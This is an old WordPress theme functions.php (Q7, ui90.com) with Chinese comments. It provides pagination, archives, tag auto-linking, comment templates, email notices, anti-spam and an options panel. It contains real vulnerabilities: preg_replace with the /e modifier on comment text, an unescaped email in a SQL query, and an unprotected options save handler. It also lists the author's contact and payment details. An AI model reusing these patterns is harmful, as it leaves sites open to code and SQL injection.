<?php 
/**********************************************************************
 Copyright © 2007-2012 秦唐网 (http://ui90.com)
 本作品采用知识共享署名-非商业性使用-相同方式共享 2.5 中国大陆许可协议
 进行许可(http://creativecommons.org/licenses/by-nc-sa/2.5/cn/)
**********************************************************************/
//登陆显示头像
//function qintag_get_avatar($email, $size = 48){
//return get_avatar($email, $size);
//}
//禁用半角符号自动转换为全角
remove_filter('the_content', 'wptexturize');

//////////////////////////////图片暗箱自动添加标签属性/////////////////
add_filter('the_content', 'pirobox_gall_replace');    
function pirobox_gall_replace ($content) {
	global $post;    
    $pattern = "/<a(.*?)href=('|\")([^>]*).(bmp|gif|jpeg|jpg|png)('|\")(.*?)>(.*?)<\/a>/i";    
    $replacement = '<a$1href=$2$3.$4$5 class="fancybox" data-fancybox-group="gallery"$6>$7</a>';    
    $content = preg_replace($pattern, $replacement, $content);    
    return $content;    
}
// -------- END -------------------------------------------------------

//////////////////////////////支持外链缩略图///////////////////////////
function get_featcat_image() {
  global $post, $posts;
  $first_img = '';
  ob_start();
  ob_end_clean();
  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
  $first_img = $matches [1] [0];
  if(empty($first_img)){ //Defines a default image
		$random = mt_rand(1, 10);
		echo get_bloginfo ( 'stylesheet_directory' );
		echo '/images/random/'.$random.'.png';
  }
  return $first_img;
}
// -------- END -------------------------------------------------------

/* Mini Pagenavi v1.0 by Willin Kan. Edit by zwwooooo */ 
if ( !function_exists('pagenavi') ) { 
    function pagenavi( $p = 2 ) { // 取当前页前后各 2 页 
        if ( is_singular() ) return; // 文章与插页不用 
        global $wp_query, $paged; 
        $max_page = $wp_query->max_num_pages; 
        if ( $max_page == 1 ) return; // 只有一页不用 
        if ( empty( $paged ) ) $paged = 1; 
		echo '<span class="page-numbers">' . $paged . '/' . $max_page . ' </span> '; // 显示页数
        if ( $paged > 1 ) p_link( $paged - 1, '上一页', '« 上一页' );/* 如果当前页大于1就显示上一页链接 */ 
        if ( $paged > $p + 1 ) p_link( 1, '最前页' ); 
        if ( $paged > $p + 2 ) echo '... '; 
        for( $i = $paged - $p; $i <= $paged + $p; $i++ ) { // 中间页 
            if ( $i > 0 && $i <= $max_page ) $i == $paged ? print "<span class='page-numbers current'>{$i}</span> " : p_link( $i ); 
        } 
        if ( $paged < $max_page - $p - 1 ) echo '... '; 
        if ( $paged < $max_page - $p ) p_link( $max_page, '最后页' ); 
        if ( $paged < $max_page ) p_link( $paged + 1,'下一页', '下一页 »' );/* 如果当前页不是最后一页显示下一页链接 */ 
    } 
    function p_link( $i, $title = '', $linktype = '' ) { 
        if ( $title == '' ) $title = "第 {$i} 页"; 
        if ( $linktype == '' ) { $linktext = $i; } else { $linktext = $linktype; } 
        echo "<a class='page-numbers' href='", esc_html( get_pagenum_link( $i ) ), "' title='{$title}'>{$linktext}</a> "; 
    } 
} 

// -------- END -------------------------------------------------------


//阻止 WordPress 对站内文章的 pingback
function no_self_ping( &$links ) {
	$home = get_option( 'home' );
	foreach ( $links as $l => $link )
	if ( 0 === strpos( $link, $home ) ) unset($links[$l]);
}
add_action( 'pre_ping', 'no_self_ping' );
// -------- END -------------------------------------------------------

//////////////////////////////archives_list/////////////////////////////////
function qintag_archives_list() {
     if( !$output = get_option('qintag_archives_list') ){
         $output = '<div id="archives"><p>[<a id="al_expand_collapse" href="#">全部展开/收缩</a>] <em>(注: 点击月份可以展开)</em></p>';
         $the_query = new WP_Query( 'posts_per_page=-1&ignore_sticky_posts=1' ); //update: 加上忽略置顶文章
         $year=0; $mon=0; $i=0; $j=0;
         while ( $the_query->have_posts() ) : $the_query->the_post();
             $year_tmp = get_the_time('Y');
             $mon_tmp = get_the_time('m');
             $y=$year; $m=$mon;
             if ($mon != $mon_tmp && $mon > 0) $output .= '</ul></li>';
             if ($year != $year_tmp && $year > 0) $output .= '</ul>';
             if ($year != $year_tmp) {
                 $year = $year_tmp;
                 $output .= '<h3 class="al_year">'. $year .' 年</h3><ul class="al_mon_list">'; //输出年份
             }
             if ($mon != $mon_tmp) {
                 $mon = $mon_tmp;
                 $output .= '<li><span class="al_mon">'. $mon .' 月</span><ul class="al_post_list">'; //输出月份
             }
             $output .= '<li>'. get_the_time('d日: ') .'<a href="'. get_permalink() .'">'. get_the_title() .'</a><em>('. get_comments_number('0', '1', '%') .')</em></li>'; //输出文章日期和标题
         endwhile;
         wp_reset_postdata();
         $output .= '</ul></li></ul></div>';
         update_option('qintag_archives_list', $output);
     }
     echo $output;
 }
 function clear_zal_cache() {
     update_option('qintag_archives_list', ''); // 清空 qintag_archives_list
 }
 add_action('save_post', 'clear_zal_cache'); // 新发表文章/修改文章时
// -------- END -------------------------------------------------------

//////////////////////////////网站信息/////////////////////////////////
function qintag_statistics() { ?>
<li>日志数：<?php global $wpdb; $count_posts = wp_count_posts(); echo $published_posts = $count_posts->publish;?> 篇</li>
<li>评论数：<?php echo $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->comments");?> 条</li>
<li>标签数：<?php echo $count_tags = wp_count_terms('post_tag'); ?> 个</li>
<li>页面数：<?php $count_pages = wp_count_posts('page'); echo $page_posts = $count_pages->publish; ?> 个</li>
<li>链接数：<?php $link = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->links WHERE link_visible = 'Y'"); echo $link; ?> 条</li>
<li>用户数：<?php $users = $wpdb->get_var("SELECT COUNT(ID) FROM $wpdb->users"); echo $users; ?> 位</li>
<li>共运行：<?php $site_time = get_qintag_option('site_time'); echo floor((time()-strtotime("$site_time"))/86400); ?> 天</li>
<li>建站日：<?php echo get_qintag_option('site_time'); ?></li><!-- 这个地方请根据自己的建站时间修改-->
<li>更新日：<?php $last = $wpdb->get_results("SELECT MAX(post_modified) AS MAX_m FROM $wpdb->posts WHERE (post_type = 'post' OR post_type = 'page') AND (post_status = 'publish' OR post_status = 'private')");$last = date('Y-n-j', strtotime($last[0]->MAX_m));echo $last; ?></li>
<li>站长QQ：<font class="red">604314031</font></li>
<?php }


/////////////////// WordPress免插件使用tags作为文章关键字站内链接/////////////////////////////
//连接数量
$match_num_from = 1;  //一个关键字少于多少不替换
$match_num_to = 2; //一个关键字最多替换
//连接到WordPress的模块
add_filter('the_content','tag_link',1);
//按长度排序
function tag_sort($a, $b){
	if ( $a->name == $b->name ) return 0;
	return ( strlen($a->name) > strlen($b->name) ) ? -1 : 1;
}
//改变标签关键字
function tag_link($content){
global $match_num_from,$match_num_to;
	 $posttags = get_the_tags();
	 if ($posttags) {
		 usort($posttags, "tag_sort");
		 foreach($posttags as $tag) {
			$link = get_tag_link($tag->term_id);
			$keyword = $tag->name;
			//连接代码
			$cleankeyword = stripslashes($keyword);
			$url = "<a href=\"$link\" title=\"".str_replace('%s',addcslashes($cleankeyword, '$'),__('View all posts in %s'))."\"";
			$url .= ' target="_blank" class="tag_link"';
			$url .= ">".addcslashes($cleankeyword, '$')."</a>";
			$limit = rand($match_num_from,$match_num_to);
			//不连接的 代码
			$content = preg_replace( '|(<a[^>]+>)(.*)('.$ex_word.')(.*)(</a[^>]*>)|U'.$case, '$1$2%&&&&&%$4$5', $content);
			$content = preg_replace( '|(<img)(.*?)('.$ex_word.')(.*?)(>)|U'.$case, '$1$2%&&&&&%$4$5', $content);
			$cleankeyword = preg_quote($cleankeyword,'\'');
			$regEx = '\'(?!((<.*?)|(<a.*?)))('. $cleankeyword . ')(?!(([^<>]*?)>)|([^>]*?</a>))\'s' . $case;
			$content = preg_replace($regEx,$url,$content,$limit);
			$content = str_replace( '%&&&&&%', stripslashes($ex_word), $content);
		 }
	 }
    return $content;
}
// -------- END -------------------------------------------------------

//////////////////////////////标题文字截断//////////////////////////////
function cut_str($src_str,$cut_length) {
    $return_str='';
    $i=0;
    $n=0;
    $str_length=strlen($src_str);
    while (($n<$cut_length) && ($i<=$str_length)) {
        $tmp_str=substr($src_str,$i,1);
        $ascnum=ord($tmp_str);
        if ($ascnum>=224) {
            $return_str=$return_str.substr($src_str,$i,3);
            $i=$i+3;
            $n=$n+2;
        }elseif ($ascnum>=192) {
            $return_str=$return_str.substr($src_str,$i,2);
            $i=$i+2;
            $n=$n+2;
        }elseif ($ascnum>=65 && $ascnum<=90) {
            $return_str=$return_str.substr($src_str,$i,1);
            $i=$i+1;
            $n=$n+2;
        }else {
            $return_str=$return_str.substr($src_str,$i,1);
            $i=$i+1;
            $n=$n+1;
        }
    }
    if ($i<$str_length) {
        $return_str = $return_str . '';
    }
    if (get_post_status() == 'private') {
        $return_str = $return_str . '（private）';
    }
    return $return_str;
}
// -------- END -------------------------------------------------------



////////////////最新日志 热评日志 随机日志 三合一代码//////////////////
function filter_where($where = '') {
    $where .= " AND post_date > '" . date('Y-m-d', strtotime('-100 days')) . "'";
    return $where;
}
function some_posts($orderby = '', $plusmsg = '',$limit = 12) {
    add_filter('posts_where', 'filter_where');
    $some_posts = query_posts('posts_per_page='.$limit.'&ignore_sticky_posts=1&orderby='.$orderby);
    foreach ($some_posts as $some_post) {
            $output = '';
			$post_date = mysql2date('y-m-d', $some_post->post_date);
            $commentcount = '('.$some_post->comment_count.' 条评论)';
            $post_title = htmlspecialchars(stripslashes($some_post->post_title));  
            $permalink = get_permalink($some_post->ID);
            $output = '<li><a href="'.$permalink.'" title="'.$post_title.'">'.cut_str($post_title,40).' <span>'.$post_date.'</span></a>'.$$plusmsg.'</li>';
            echo $output;
        }
    wp_reset_query();
}
// -------- END -------------------------------------------------------

//////////相关文章代码，来源：http://kan.willin.org/?p=1318////////////
function related_posts() {
$post_num = 8; // 數量設定.
global $post;
$tmp_post = $post;
$tags = ''; $i = 0; // 先取 tags 文章.
$exclude_id = $post->ID;
$posttags = get_the_tags();
if ( $posttags ) {
  foreach ( $posttags as $tag ) $tags .= $tag->name . ',';
  $tags = strtr(rtrim($tags, ','), ' ', '-');
  $myposts = get_posts('numberposts='.$post_num.'&tag='.$tags.'&exclude='.$exclude_id);
  foreach($myposts as $post) {
    setup_postdata($post);
    ?>
    <li><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></li>
    <?php
    $exclude_id .= ','.$post->ID; $i ++;
  }
}
if ( $i < $post_num ) { // 當 tags 文章數量不足, 再取 category 補足.
  $post = $tmp_post; setup_postdata($post);
  $cats = ''; $post_num -= $i;
  foreach ( get_the_category() as $cat ) $cats .= $cat->cat_ID . ',';
  $cats = strtr(rtrim($cats, ','), ' ', '-');
  $myposts = get_posts('numberposts='.$post_num.'&category='.$cats.'&exclude='.$exclude_id);
  foreach($myposts as $post) {
    setup_postdata($post);
    ?>
    <li><a href="<?php the_permalink(); ?>"><?php echo cut_str($post->post_title,50); ?></a></li>

    <?php
    $i ++;
  }
}
if ( $i == 0 ) echo '<li>暂无相关文章</li>';
$post = $tmp_post; setup_postdata($post);
}
// -------- END -------------------------------------------------------

////////////////      评论部分      ///////////////////////////////////

//评论贴图
function embed_images($content) {
	$content = preg_replace('/\[img=?\]*(.*?)(\[\/img)?\]/e', '"<img src=\"$1\" alt=\"" . basename("$1") . "\" />"', $content);
	return $content;
}
add_filter('comment_text', 'embed_images');

//留言信息
function WelcomeCommentAuthorBack($email = ''){
	if(empty($email)){
		return;
	}
	global $wpdb;

	$past_30days = gmdate('Y-m-d H:i:s',((time()-(24*60*60*30))+(get_option('gmt_offset')*3600)));
	$sql = "SELECT count(comment_author_email) AS times FROM $wpdb->comments
					WHERE comment_approved = '1'
					AND comment_author_email = '$email'
					AND comment_date >= '$past_30days'";
	$times = $wpdb->get_results($sql);
	$times = ($times[0]->times) ? $times[0]->times : 0;
	$message = $times ? sprintf(__('过去30天内您有<strong>%1$s</strong>条留言，感谢关注!' ), $times) : '您已很久都没有留言了，这次想说点什么？';

	return $message;
}

// 判断管理员
function is_admin_comment( $comment_ID = 0 ) {
	$comment = get_comment( $comment_ID );
	$admin_comment = false; //设置一个布尔类型的变量用于判断该留言的ID是否为管理员的留言
	if($comment->user_id == 1){
		$admin_comment = true;
	}
	return $admin_comment;
}

// 评论回复
function qintag_comment($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment;
	//主评论计数器初始化 begin
	global $commentcount;
	if(!$commentcount) { //初始化楼层计数器
		$page = get_query_var('cpage')-1;
		$cpp=get_option('comments_per_page');//获取每页评论数
		$commentcount = $cpp * $page;
	}
	//主评论计数器初始化
	?>
        <li <?php comment_class(); ?> id="comment-<?php comment_ID() ?>">
        <div id="comment-<?php comment_ID(); ?>">
            <div class="comment-author vcard">
                <?php echo get_avatar( $comment, 56 ); ?>
                <?php printf(__('<cite class="fn">%s</cite>'), get_comment_author_link()) ?>
				<span class="time">
					<?php echo get_comment_date('Y'); ?>-<?php echo get_comment_date('j'); ?>-<?php echo get_comment_date('m'); ?>
				</span>
                <?php edit_comment_link(__('(Edit)'),'  ','') ?>
                <?php if(function_exists('useragent_output_custom')) {
                     echo useragent_output_custom(); } else { echo '请安装 wp-useragent 插件'; } ?>
                
                <?php if ($comment->comment_approved == '0') : ?>
                    <font color=#d00030>您的评论需要管理员审核...</font>
                <?php endif; ?>
            </div>
            <div class="comment-body">
                <?php comment_text(); ?>
                <?php if($comment->comment_author_email == "qintag@qq.com") echo "<div id='comment_admin_img'><img src='http://blog.ui90.com/qt_share/admin.gif'></div>" ?><!-- 修改 -->
            </div>
            <div class="reply">
                <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
            </div>
            <div class="floor"><!-- 主评论楼层号-->
                <?php if(!$parent_id = $comment->comment_parent) {printf('#%1$s楼', ++$commentcount);} ?><!-- 当前页每个主评论自动+1 -->
            </div>
        </div>
    <?php
}
// -------- END -------------------------------------------------------



//////////////////////// Comment And Ping Setup ///////////////////////
function list_pings($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment; 
	?>
		<li id="comment-<?php comment_ID(); ?>"><?php comment_author_link(); ?>
	<?php
}
	
add_filter('get_comments_number', 'comment_count', 0);
function comment_count( $count ) {
	global $id;
	$comments_by_type = &separate_comments(get_comments('post_id=' . $id));
	return count($comments_by_type['comment']);
}

	
	
// -------- END -------------------------------------------------------
/////////////// Comment and pingback separate controls ////////////////
$bm_trackbacks = array();
$bm_comments = array();
function split_comments( $source ) {
	if ( $source ) foreach ( $source as $comment ) {
		global $bm_trackbacks;
		global $bm_comments;
			if ( $comment->comment_type == 'trackback' || $comment->comment_type == 'pingback' ) {
				$bm_trackbacks[] = $comment;
			} else {
			$bm_comments[] = $comment;
			}
		}
	}
// -------- END -------------------------------------------------------

///////////////////////// 评论回应邮件通知 ////////////////////////////
function comment_mail_notify($comment_id) {
  $admin_notify = '1'; // admin 要不要收回复通知 ( '1'=要 ; '0'=不要 )
  $admin_email = get_bloginfo ('admin_email'); // $admin_email 可改为你指定的 e-mail.
  $comment = get_comment($comment_id);
  $comment_author_email = trim($comment->comment_author_email);
  $parent_id = $comment->comment_parent ? $comment->comment_parent : '';
  global $wpdb;
  if ($wpdb->query("Describe {$wpdb->comments} comment_mail_notify") == '')
    $wpdb->query("ALTER TABLE {$wpdb->comments} ADD COLUMN comment_mail_notify TINYINT NOT NULL DEFAULT 0;");
  if (($comment_author_email != $admin_email && isset($_POST['comment_mail_notify'])) || ($comment_author_email == $admin_email && $admin_notify == '1'))
    $wpdb->query("UPDATE {$wpdb->comments} SET comment_mail_notify='1' WHERE comment_ID='$comment_id'");
  $notify = $parent_id ? get_comment($parent_id)->comment_mail_notify : '0';
  $spam_confirmed = $comment->comment_approved;
  if ($parent_id != '' && $spam_confirmed != 'spam' && $notify == '1') {
    $wp_email = 'no-reply@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME'])); // e-mail 发出点, no-reply 可改为可用的 e-mail.
    $to = trim(get_comment($parent_id)->comment_author_email);
    $subject = '您在 [' . get_option("blogname") . '] 的留言有了回应';
    $message = '
    <div style="background-color:#eef2fa; border:1px solid #d8e3e8; color:#111; padding:0 15px; -moz-border-radius:5px; -webkit-border-radius:5px; -khtml-border-radius:5px;">
      <p>' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p>
      <p>您曾在《' . get_the_title($comment->comment_post_ID) . '》的留言:<br />'
       . trim(get_comment($parent_id)->comment_content) . '</p>
      <p>' . trim($comment->comment_author) . ' 给您的回应:<br />'
       . trim($comment->comment_content) . '<br /></p>
      <p>您可以点击 <a href="' . htmlspecialchars(get_comment_link($parent_id)) . '">查看回应完整內容</a></p>
      <p>欢迎您再度光临 <a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>
      <p>(此邮件由系统自动发出，请勿回复.)</p>
    </div>';
    $from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
    $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
    wp_mail( $to, $subject, $message, $headers );
    //echo 'mail to ', $to, '<br/> ' , $subject, $message; // for testing
  }
}
add_action('comment_post', 'comment_mail_notify');

// 自动勾选 
function add_checkbox() {
  echo '<input type="checkbox" name="comment_mail_notify" id="comment_mail_notify" value="comment_mail_notify" checked="checked" class="notify_checked" /><label for="comment_mail_notify" class="notify_p">有人回复时邮件通知我</label>';
}
add_action('comment_form', 'add_checkbox');




// -------- END -------------------------------------------------------



/* -----------------------------------------------
<<小牆>> Anti-Spam v1.9 by Willin Kan.
*/

//建立
class anti_spam {
  function anti_spam() {
    if ( !is_user_logged_in() ) {
      add_action('template_redirect', array($this, 'w_tb'), 1);
      add_action('pre_comment_on_post', array($this, 'gate'), 1);
      add_action('preprocess_comment', array($this, 'sink'), 1);
    }
  }
  //設欄位
  function w_tb() {
    if ( is_singular() ) {
      ob_start(create_function('$input', 'return preg_replace("#textarea(.*?)name=([\"\'])comment([\"\'])(.+)/textarea>#",
      "textarea$1name=$2w$3$4/textarea><textarea name=\"comment\" cols=\"60\" rows=\"4\" style=\"display:none\"></textarea>", $input);') );
    }
  }
  //檢查
  function gate() {
    ( !empty($_POST['w']) && empty($_POST['comment']) ) ? $_POST['comment'] = $_POST['w'] : $_POST['spam_confirmed'] = 1;
  }
  //處理
  function sink( $comment ) {
    if ( !empty($_POST['spam_confirmed']) ) {
      //方法一:直接擋掉, 將 die(); 前面兩斜線刪除即可.
      //die();
      //方法二:標記為spam, 留在資料庫檢查是否誤判.
      add_filter('pre_comment_approved', create_function('', 'return "spam";'));
      $comment['comment_content'] = "[ 小牆判斷這是Spam! ]\n" . $comment['comment_content'];
    }
    return $comment;
  } 
}
$anti_spam = new anti_spam();

// -- END ----------------------------------------

//////////////////////////////3.0菜单支持//////////////////////////////
if ( function_exists( 'add_theme_support' ) ) {
	add_theme_support( 'post-thumbnails' ); //添加缩略图功能支持
	set_post_thumbnail_size( 125, 125, true ); //特色图片的尺寸
	add_image_size( 'gallery125cc125', 125, 125, true ); // 

    // 为主题增加导航菜单
	register_nav_menus( array(
		'primary' => __( 'mainNav'),
	) );
    add_theme_support( 'menus' ); 
}
function revert_wp_menu_category() { //没有设置导航菜单时调用 ?>
	<ul id="access" class="menu">
    	<li><a target="_blank" href="<?php bloginfo('url'); ?>" title="首页">首页</a></li>
		<?php wp_list_categories('title_li=&orderby=name&number=10'); ?>
	</ul><!-- access end -->
<?php }

// -------- END -------------------------------------------------------


///////////////////////////主题设置////////////////////////////////////
$themename = "Q7";
$shortname = str_replace(' ', '_', strtolower($themename));
function get_qintag_option($option){
	global $shortname;
	return stripslashes(get_option($shortname . '_' . $option));
}
$number_entries = array("Number of post:","1","2","3","4","5","6","7","8","9","10");
$categories = get_categories('hide_empty=0&orderby=name');
$wp_cats = array();
foreach ($categories as $category_list ) {
       $wp_cats[$category_list->cat_ID] = $category_list->cat_name;
}

array_unshift($wp_cats, "请选择...");
$options = array (
array( "name" => $themename." Options", "type" => "title"),

array( "name" => "首要设置", "type" => "section"),
array( "type" => "open"),
	
array( "name" => "网站关键词",
	"desc" => "网站关键字，例如：秦唐网,胖子马,forigi,purple,mapeimapei,qintag",
	"id" => $shortname."_indexkeyword",
	"type" => "textarea",
	"std" => ""),

array( "name" => "网站描述",
	"desc" => "例如：秦唐网，小马PE，专注于网站建设、网络营销和电脑技术的研究与分享",
	"id" => $shortname."_indexdescription",
	"type" => "textarea",
	"std" => ""),

	
array( "name" => "网站建立日期",
	"desc" => "您的网站建立日期，格式如：2007-9-18",
	"id" => $shortname."_site_time",
	"type" => "texts",
	"std" => "2007-9-18"),
	
	
array( "type" => "close"),

///////////////////////////////////////////////////////////////////////
array( "name" => "网站广告管理", "type" => "section"),
array( "type" => "open"),

array( "name" => "网站首页广告位",
	"desc" => "468*60",
	"id" => $shortname."_top_ads",
	"type" => "textarea",
	"std" => ""),
	
array( "name" => "主导航上部的广告",
	"desc" => "大小120*90",
	"id" => $shortname."_nav_top_ads",
	"type" => "textarea",
	"std" => ""),

array( "name" => "主导航160*600广告",
	"desc" => "大小160*600",
	"id" => $shortname."_nav_ads",
	"type" => "textarea",
	"std" => ""),

array( "name" => "文章开头广告",
	"desc" => "大小468*60",
	"id" => $shortname."_post_top_ads",
	"type" => "textarea",
	"std" => ""),
	
array( "name" => "文章底部广告",
	"desc" => "大小468*60",
	"id" => $shortname."_post_bottom_ads",
	"type" => "textarea",
	"std" => ""),
	
	
array( "name" => "文章底部广告ads200_a",
	"desc" => "大小200*200",
	"id" => $shortname."_ads200_a",
	"type" => "textarea",
	"std" => ""),
	
	
array( "name" => "文章底部广告ads200_b",
	"desc" => "大小200*200",
	"id" => $shortname."_ads200_b",
	"type" => "textarea",
	"std" => ""),
	
	
array( "name" => "文章底部广告ads200_c",
	"desc" => "大小200*200",
	"id" => $shortname."_ads200_c",
	"type" => "textarea",
	"std" => ""),
	


array( "name" => "侧边栏左边大广告",
	"desc" => "侧边栏左边大广告",
	"id" => $shortname."_sidebarAds_b",
	"type" => "textarea",
	"std" => ""),

array( "name" => "评论框的邻居",
	"desc" => "大小为180*150的广告，代码，图片随意",
	"id" => $shortname."_ad_comment_180_150",
	"type" => "textarea",
	"std" => ""),
	
array( "type" => "close"),

//////////////////////////////////////////////////////////////////////////////

array( "name" => "页脚部分", "type" => "section"),
array( "type" => "open"),

array( "name" => "ICP备案号",
	"desc" => "您的ICP备案信息，如：陕ICP备11004443号",
	"id" => $shortname."_icpbeian",
	"type" => "texts",
	"std" => "陕ICP备12345678号"),
	
array( "name" => "统计代码",
	"desc" => "cnzz等网站统计代码，这个就不多解释了",
	"id" => $shortname."_cnzztongji",
	"type" => "textarea",
	"std" => ""),

array( "type" => "close"),

);

//////////////////////////////////////////////////////////////////////////////
function qintag_add_admin() {
	global $themename, $shortname, $options;
		if ( $_GET['page'] == basename(__FILE__) ) {
			if ( 'save' == $_REQUEST['action'] ) {
				foreach ($options as $value) {
					update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }
				foreach ($options as $value) {
					if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }
				header("Location: admin.php?page=functions.php&saved=true");
				die;
				} 
			else if( 'reset' == $_REQUEST['action'] ) {
				foreach ($options as $value) {
					delete_option( $value['id'] ); }
					header("Location: admin.php?page=functions.php&reset=true");
					die;
			}
		}
	add_theme_page($themename." Options", "设置当前主题", 'edit_themes', basename(__FILE__), 'qintag_admin');
}

//////////////////////////////////////////////////////////////////////////////
function qintag_add_init() {
	$file_dir=get_bloginfo('template_directory');
	wp_enqueue_style("functions", $file_dir."/css/functions/functions.css", false, "1.0", "all");
	wp_enqueue_script("rm_script", $file_dir."/css/functions/rm_script.js", false, "1.0");
}

//////////////////////////////////////////////////////////////////////////////
function qintag_admin() {
	global $themename, $shortname, $options; $i=0;
		if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' 设置完成.</strong></p></div>';
		if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' 重置完成.</strong></p></div>';
?>


<div class="rm_wraps">

<form method="post">
<div class="rm_wrap">
	<h2><?php echo $themename; ?> 主题设置</h2>
		<p>当前使用主题: <?php echo $themename; ?> | 设计者:<a href="http://blog.ui90.com" target="_blank"> june</a> | <a href="http://blog.ui90.com/?p=8812" target="_blank">查看主题更新</a></p>
	<div class="rm_opts">
		<?php foreach ($options as $value) {
			switch ( $value['type'] ) {
			case "open":
		?>
		<?php break;
			case "close":
		?>
	</div>
</div>
	
<?php break;
case "title":
?>

<div id="announce">
	<h1>欢迎您使用 <?php echo "$themename"; ?> 主题</h1>
	<span>更方便的使用：
		(1) <a href="http://www.ui90.com" target="_blank">june主题作品集合</a>;
		(2) <a href="http://blog.ui90.com/?p=8809" target="_blank">app主题帮助中心</a>;
		(3) <a href="http://weibo.com/qintag" target="_blank">新浪博客</a>;
		(4) <a href="http://feed.ui90.com" target="_blank"><img border="0" src="http://img.feedsky.com/images/icon_sub_c1s14.gif" alt="feedsky" vspace="2"  style="margin:10px 0 0 0;" ></a>
	</span>
</div>

<?php
break;
case 'texts':
?>
<div class="rm_input rm_text">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
 	<input name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo stripslashes(get_settings( $value['id'])  ); } else { echo $value['std']; } ?>" />
	<small><?php echo $value['desc']; ?></small>
	<div class="clearfix"></div>
</div>

<?php
break;
case 'textarea':
?>
<div class="rm_input rm_textarea">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
 	<textarea name="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" cols="" rows=""><?php if ( get_settings( $value['id'] ) != "") { echo stripslashes(get_settings( $value['id']) ); } else { echo $value['std']; } ?></textarea>
	<small><?php echo $value['desc']; ?></small>
	<div class="clearfix"></div>
</div>

<?php
break;
case 'select':
?>
<div class="rm_input rm_select">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
	<select name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
<?php foreach ($value['options'] as $option) { ?>
		<option value="<?php echo $option;?>" <?php if (get_settings( $value['id'] ) == $option) { echo 'selected="selected"'; } ?>>
		<?php
		if ((empty($option) || $option == '' ) && isset($value['default_option_value'])) {
			echo $value['default_option_value'];
		} else {
			echo $option; 
		}?>
		
		</option><?php } ?>
</select>
	<small><?php echo $value['desc']; ?></small><div class="clearfix"></div>
</div>

<?php
break;
case "checkbox":
?>
<div class="rm_input rm_checkbox">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
	<?php if(get_option($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = "";} ?>
	<input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
	<small><?php echo $value['desc']; ?></small>
	<div class="clearfix"></div>
</div>

<?php break; 
case "section":
$i++;
?>
<div class="rm_section">
	<div class="rm_title">
		<h3><img src="<?php bloginfo('template_directory')?>/css/functions/trans.png" class="inactive" alt="""><?php echo $value['name']; ?></h3><span class="submit"><input name="save<?php echo $i; ?>" type="submit" value="保存设置" /></span>
		<div class="clearfix"></div>
	</div>

	<div class="rm_options">
		<?php break;
			}
			}
		?>
		<input type="hidden" name="action" value="save" />
	</div>
</form>

	<form method="post">
		<p class="submit">
			<input name="reset" type="submit" value="恢复默认" /><font color=#ff0000>提示：此按钮将恢复主题初始状态，您的所有设置将消失！</font>
			<input type="hidden" name="action" value="reset" />
		</p>
	</form>


	<div id="sthiks">
		<h1>其 它</h1>
		<p>本人在<?php echo $themename; ?>主题制作中，也倾入了诸多心血，所以不能保留底部链接的，不尊重我的劳动成果的人，请绕行，不欢迎你使用本主题！</p>
		<p class="note">本作品采用<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/2.5/cn/">知识共享署名-非商业性使用-相同方式共享 2.5 中国大陆许可协议</a>进行许可。</p>
	</div>
</div>

<div id="other">
	<h1>扩展</h1>
	<div id="other_c">
		<form id="search" method="get" action="http://blog.ui90.com/">
			<input class="other_s" type="text" name="s" id="textfield" onblur="if (this.value == '') {this.value = '输入关键词搜索...';}" onfocus="if (this.value == '输入关键词搜索...') {this.value = '';}" value="输入关键词搜索..." />
			<input class="other_btn" type="submit" id="submit" value="搜索" />
		</form>

		<?php // Get RSS Feed(s)
			include_once(ABSPATH . WPINC . '/feed.php');
			$rss = fetch_feed('http://blog.ui90.com/feed');			
			// Of the RSS is failed somehow.
			if ( is_wp_error($rss) ) {
				$error = $rss->get_error_code();
				if($error == 'simplepie-error') {
					//Simplepie Error
					echo "<div class='updated fade'><p>An error has occured with the RSS feed. (<code>". $error ."</code>)</p></div>";
				}
				return;
				} 
		?>
        <?php
			$items = $rss->get_items(0, 10);
        ?>
		<h2 class="bg2">主题相关文章</h2>	
        <ol>
			<?php
				if (empty($items))
					echo '<li>No items</li>';
				else
					foreach ( $items as $item ) : ?>
					<li>
						<a target="_blank" href='<?php echo esc_url( $item->get_permalink() ); ?>' title='<?php echo $item->get_title(); ?>'><?php echo ( $item->get_title() ); ?></a>
					</li>
			<?php endforeach; ?>
			<a style="float:right;padding-top:5px;padding-right:10px;font-weight:700;" target="_blank" href='http://blog.ui90.com/'>更多内容>></a>
        </ol>

		<h2 class="bg3">捐助：</h2>
		<p>您的支持，是对小马最大的鼓励和肯定！<br />
		<strong>支付宝：<font color=#21759b>qintag@sina.com</font></strong> 姓名:马沛</p>
		<a target="_blank" href='http://me.alipay.com/qintag'> <img src='https://img.alipay.com/sys/personalprod/style/mc/btn-index.png' /> </a>
	</div>
</div>
<?php } 
//以下代码绝无恶意代码，仅用于版权保护;
